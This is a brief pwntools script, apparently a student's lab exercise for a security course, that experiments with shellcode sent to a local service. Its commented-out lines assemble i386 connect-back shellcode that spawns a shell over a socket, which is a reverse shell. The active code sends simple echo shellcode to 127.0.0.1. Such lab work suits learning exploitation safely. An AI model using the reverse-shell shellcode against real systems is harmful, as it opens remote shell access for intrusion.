#!/usr/bin/env python

""" network_sweep for OPSC-540 week 6

Trying to figure out the shellcraft assignment for week 6 project for OPSC-540.

__author__ = "Brian Levin"
__copyright__ = "Copyright 2022, Brian Levin"
__credits__ = ["Brian Levin", "Todd Strunce"]
__license__ = "AGPL"
__version__ = "0.0.1"
__maintainer__ = "Brian Levin"
__email__ = "brian.levin@mymail.champlain.edu"
__status__ = "Assignment"
__note__ = "This is experimental and could use error handling. Use at your own peril!"
"""

import pwn


if __name__ == "__main__":

    pwn.context.arch = "i386"
    # assembly = pwn.shellcraft.connect("127.0.0.1", 9998)
    # print(assembly)


    # shellcode = pwn.shellcraft.connect('127.0.0.1', 9998) + pwn.shellcraft.dupsh('edx')
    # print(shellcode)



    # process = pwn.runner.run_shellcode(pwn.asm(pwn.shellcraft.connect('127.0.0.1', 9998) + pwn.shellcraft.dupsh('edx')))

    # r = pwn.remote('127.0.0.1', 9998)
    # r.sendline(pwn.asm(pwn.shellcraft.connect('127.0.0.1', 9999) + pwn.shellcraft.dupsh('edx')))

    payload = pwn.shellcraft.echo(b"Hello world")
    r = pwn.remote('127.0.0.1', 9998)
    r.sendline(payload)




    # end main
